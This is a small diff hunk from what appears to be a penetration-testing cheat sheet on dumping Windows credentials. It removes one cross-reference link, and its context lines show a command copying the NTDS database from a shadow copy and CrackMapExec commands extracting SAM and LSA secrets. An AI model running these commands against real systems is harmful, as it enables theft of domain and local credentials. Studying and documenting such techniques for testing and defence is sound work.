@@ -35,8 +35,6 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTD
 
 ### CrackMapExec
 
-You can also refer to [Commands Cheatsheet for CrackMapExec](/commands-cheatsheet/crackmapexec).
-
 ```bash
 crackmapexec smb <ip> -u <user> -p <password> --sam
 crackmapexec smb <ip> -u <user> -p <password> --lsa
